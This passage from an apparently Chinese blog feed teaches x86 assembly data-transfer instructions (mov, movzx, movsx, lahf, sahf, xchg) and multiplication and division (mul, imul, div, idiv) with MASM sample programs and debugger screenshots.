<h4 id="reg通用寄存器"><a class="anchor" href="#reg通用寄存器">#</a> reg：通用寄存器</h4>
<ul>
<li>reg8：8 位</li>
<li>reg16：16 位</li>
<li>reg32：32 位</li>
</ul>
<p><strong>sreg：段寄存器</strong></p>
<h4 id="imm立即数"><a class="anchor" href="#imm立即数">#</a> imm：立即数</h4>
<ul>
<li>imm8：8 位立即数</li>
<li>imm16：16 位立即数</li>
<li>imm32：32 位立即数</li>
</ul>
<h4 id="mem内存"><a class="anchor" href="#mem内存">#</a> mem：内存</h4>
<ul>
<li>mem8：8 位内存</li>
<li>mem16：16 位内存</li>
<li>mem32：32 位内存</li>
</ul>
<h3 id="mov的用法"><a class="anchor" href="#mov的用法">#</a> mov 的用法</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>mov 目的操作数 源操作数</pre></td></tr></table></figure><p>mov a,15 它就相当于 C 语言中的 int a = 15，a 为目的操作数，15 为源操作数</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>mov reg<span class="token punctuation">,</span>reg<span class="token punctuation">;</span>从寄存器到寄存器，把一个寄存器的复制到另一个寄存器</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>mov mem<span class="token punctuation">,</span>reg<span class="token punctuation">;</span>把寄存器中的值拷贝到内存中</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>mov reg<span class="token punctuation">,</span>mem<span class="token punctuation">;</span>把内存中的值复制到寄存器中</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>mov mem<span class="token punctuation">,</span>imm<span class="token punctuation">;</span>把立即数拷贝到内存中</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>mov reg<span class="token punctuation">,</span>imm<span class="token punctuation">;</span>把立即数存到寄存器中</pre></td></tr></table></figure><p>那么如何利用 mov 将较小的值传输到较大的值呢？</p>
<p>例如：将 reg16 传输到 reg32 当中</p>
<p>因为 32 寄存器存在高低位以 eax 为例，如 mov eax,cx，eax 第 16 位是 ax，而 ax 还分为 ah，al，所以说 ax 位 16 位而 al 为 8 位</p>
<p>如果要将 16 位赋值到 32 位寄存器，这个时候就要用 ax 来接收 cx，而这个时候就要对 eax 进行初始化，否则会出现不必要的错误，例如 mov eax,FFFFFFFF</p>
<p>而除了这种直接给它进行初始化方式的方法外，还存在另一种方法，通过 movzx 指令实现</p>
<p><strong>movzx 指令则是用来进行全零扩展，并进数据传送</strong></p>
<p>例如：movzx eax,cx，若此时 cx 为 1234，那么 eax 则表示为 00001234</p>
<p>二进制表示为</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>eax <span class="token operator">=</span> <span class="token number">1010101010101010</span></pre></td></tr><tr><td data-num="2"></td><td><pre>cx <span class="token operator">=</span> <span class="token number">10101010</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">;</span>填充为：<span class="token number">0000000010101010</span></pre></td></tr></table></figure><p>除全零扩展之外还存在全一扩展</p>
<p><strong>movsx 指令则是用来进行全一扩展，并进数据传送</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>eax <span class="token operator">=</span> <span class="token number">1010101010101010</span></pre></td></tr><tr><td data-num="2"></td><td><pre>cx <span class="token operator">=</span> <span class="token number">10101010</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">;</span>填充为：<span class="token number">1111111110101010</span></pre></td></tr></table></figure><h3 id="lahf"><a class="anchor" href="#lahf">#</a> LAHF</h3>
<p>LAHF 也可进行数据传送：用来加载状态标识到 ah 寄存器中，ah 为 ax 中高 8 位而 al 为低 8 位</p>
<p>lahf 是单指令运算符，无操作数，但会会 ah 的 8 位寄存器产生影响</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>lahf</pre></td></tr><tr><td data-num="2"></td><td><pre>mov flag<span class="token punctuation">,</span>ah</pre></td></tr></table></figure><h3 id="sahf"><a class="anchor" href="#sahf">#</a> SAHF</h3>
<p>sahf 会将 ah 中的值拷贝会 flag 当中，与 lahf 作用相反</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>mov ah<span class="token punctuation">,</span>flag</pre></td></tr><tr><td data-num="2"></td><td><pre>sahf</pre></td></tr></table></figure><h3 id="xchg"><a class="anchor" href="#xchg">#</a> XCHG</h3>
<p>只对寄存器和内存进行交换，无立即数</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>xchg reg<span class="token punctuation">,</span>reg<span class="token punctuation">;</span>将寄存器中的值进行交换</pre></td></tr><tr><td data-num="2"></td><td><pre>xchg reg<span class="token punctuation">,</span>mem<span class="token punctuation">;</span>将内存和寄存器中的值进行交换</pre></td></tr><tr><td data-num="3"></td><td><pre>xchg mem<span class="token punctuation">,</span>reg<span class="token punctuation">;</span>将寄存器和内存中的值进行交换</pre></td></tr></table></figure>]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言之乘法与除法指令及扩展加减法学习</title>
    <url>/article/c66b0376.html</url>
    <content><![CDATA[<p>2022 年，祝大家虎虎生威，在新的一年里如虎添 &quot;亿&quot;！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/6552ACE61B22AF9BF38AF19117707646.gif" alt="image-6552ACE61B22AF9BF38AF19117707646" /></p>
<h1 id="乘法与除法指令"><a class="anchor" href="#乘法与除法指令">#</a> 乘法与除法指令</h1>
<h2 id="乘法mulimul"><a class="anchor" href="#乘法mulimul">#</a> 乘法 mul/imul</h2>
<p><strong>符号</strong></p>
<ul>
<li>
<p>无符号：mul div</p>
</li>
<li>
<p>有符号：imul idiv</p>
</li>
</ul>
<p><strong>元素</strong></p>
<ul>
<li>
<p>乘数：bl bx ebx</p>
</li>
<li>
<p>被乘数：al ax eax</p>
</li>
</ul>
<h3 id="无符号测试"><a class="anchor" href="#无符号测试">#</a> 无符号测试</h3>
<h4 id="八位乘法"><a class="anchor" href="#八位乘法">#</a> 八位乘法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	mov al<span class="token punctuation">,</span><span class="token number">5</span>h</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov bl<span class="token punctuation">,</span><span class="token number">10</span>h</pre></td></tr><tr><td data-num="22"></td><td><pre>	mul bl</pre></td></tr><tr><td data-num="23"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="26"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="27"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p>eax = 5</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204162659125.png" alt="image-20220204162659125" /></p>
<p>ebx = 10</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204162716471.png" alt="image-20220204162716471" /></p>
<p>eax = 50</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204162730441.png" alt="image-20220204162730441" /></p>
<h4 id="十六位乘法"><a class="anchor" href="#十六位乘法">#</a> 十六位乘法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov ax<span class="token punctuation">,</span><span class="token number">2000</span>h</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov bx<span class="token punctuation">,</span><span class="token number">100</span>h</pre></td></tr><tr><td data-num="23"></td><td><pre>	mul bx</pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p>eax = 2000</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204163308096.png" alt="image-20220204163308096" /></p>
<p>ebx = 100</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204163322166.png" alt="image-20220204163322166" /></p>
<p>edx = 20，也即 00200000</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204163338775.png" alt="image-20220204163338775" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204163444599.png" alt="image-20220204163444599" /></p>
<h4 id="32位乘法"><a class="anchor" href="#32位乘法">#</a> 32 位乘法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">12345</span>h</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov ebx<span class="token punctuation">,</span><span class="token number">1000</span>h</pre></td></tr><tr><td data-num="23"></td><td><pre>	mul ebx</pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p>eax = 12345</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204164654094.png" alt="image-20220204164654094" /></p>
<p>ebx = 1000</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204164804220.png" alt="image-20220204164804220" /></p>
<p>eax = 12345000</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204164820611.png" alt="image-20220204164820611" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204165002073.png" alt="image-20220204165002073" /></p>
<p>以上就是无符号运算的测试结果，接下来进行有符号的乘法运算测试。</p>
<h3 id="有符号测试"><a class="anchor" href="#有符号测试">#</a> 有符号测试</h3>
<p>首先我们要知道的是 imul 执行有符号的乘法不同于 mul 执行无符号的乘法的地方是：imul 会保持乘积的符号。</p>
<p>它实现的方法就是把这个乘积的低半部分的一个最高位的符号扩展到高半部分上去。</p>
<p>另外 imul 的三种模式分为</p>
<ul>
<li>一个操作数：乘积放在 ax，bx 中，类似于 mul</li>
<li>两个操作数：乘积放在第一个操作数中，此时这个操作数必须是一个寄存器</li>
<li>三个操作数：后两个操作数的运算结果存放到操作数一当中，且第三个操作数为立即数</li>
</ul>
<h4 id="双操作数测试"><a class="anchor" href="#双操作数测试">#</a> 双操作数测试</h4>
<p><strong>测试样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">12345</span>h</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov ebx<span class="token punctuation">,</span><span class="token number">1000</span>h</pre></td></tr><tr><td data-num="23"></td><td><pre>	imul eax<span class="token punctuation">,</span>ebx</pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204182830693.png" alt="image-20220204182830693" /></p>
<p>更改 ebx = 100000h 时，可以看到 eax 已经溢出，但是并没有存放到 edx 中</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204182917791.png" alt="image-20220204182917791" /></p>
<p>也即运行结果存放在第一个操作数当中，此时其相当于一个寄存器。</p>
<h4 id="三操作数测试"><a class="anchor" href="#三操作数测试">#</a> 三操作数测试</h4>
<p><strong>测试样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">12345</span>h</pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">;</span>mov ebx<span class="token punctuation">,</span><span class="token number">100000</span>h</pre></td></tr><tr><td data-num="23"></td><td><pre>	imul edx<span class="token punctuation">,</span>eax<span class="token punctuation">,</span><span class="token number">12</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p>eax = 12345h</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204183625596.png" alt="image-20220204183625596" /></p>
<p>可以看到计算存放在 edx 中，也即第一个操作数当中</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204183703000.png" alt="image-20220204183703000" /></p>
<h2 id="除法dividiv"><a class="anchor" href="#除法dividiv">#</a> 除法 div/idiv</h2>
<p><strong>元素</strong></p>
<ul>
<li>除数</li>
<li>被除数</li>
<li>商</li>
<li>余数</li>
</ul>
<p><strong>使用格式</strong></p>
<ul>
<li>div mem/reg (除数)</li>
</ul>
<p>可以时内存或寄存器，但不能是立即数</p>
<p><strong>被除数</strong></p>
<ul>
<li>八位：AX</li>
<li>十六位：DX:ax</li>
<li>32 位：edx:eax</li>
</ul>
<p><strong>商和余数</strong></p>
<ul>
<li>八位：al ah</li>
<li>十六位：ax dx</li>
<li>32 位：eax edx</li>
</ul>
<h3 id="八位十六寄存器"><a class="anchor" href="#八位十六寄存器">#</a> 八位十六寄存器</h3>
<p><strong>测试样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov ax<span class="token punctuation">,</span><span class="token number">100</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	mov bl<span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	div bl</pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185032764.png" alt="image-20220204185032764" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185052140.png" alt="image-20220204185052140" /></p>
<p>计算结果</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185112552.png" alt="image-20220204185112552" /></p>
<p>可以看到商为 50，余数为 0</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185242669.png" alt="image-20220204185242669" /></p>
<p>将 ax 换成 101 进行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185354706.png" alt="image-20220204185354706" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185410056.png" alt="image-20220204185410056" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185424905.png" alt="image-20220204185424905" /></p>
<p>此时可以看到余数为 1</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185448374.png" alt="image-20220204185448374" /></p>
<p>idiv 基本与 div 相同，但在执行前需要对除数进行包扩展，把一个数的最高位复制到包含这个数的变量或寄存器的高位中。</p>
<p><strong>三种扩展指令</strong></p>
<ul>
<li>cbw   字节转字</li>
<li>cwd   字转双字：ax 的符号位扩展到 dx 中</li>
<li>cdq    双字转四字：eax 的符号位扩展到 edx 中</li>
</ul>
<p><strong>测试样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>val sbyte <span class="token operator">-</span><span class="token number">48</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>    xor eax<span class="token punctuation">,</span>eax</pre></td></tr><tr><td data-num="20"></td><td><pre>    xor ebx<span class="token punctuation">,</span>ebx</pre></td></tr><tr><td data-num="21"></td><td><pre>    xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov al<span class="token punctuation">,</span>val</pre></td></tr><tr><td data-num="23"></td><td><pre>	cwd</pre></td></tr><tr><td data-num="24"></td><td><pre>	mov bl<span class="token punctuation">,</span><span class="token operator">+</span><span class="token number">5</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	idiv bl</pre></td></tr><tr><td data-num="26"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="28"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td 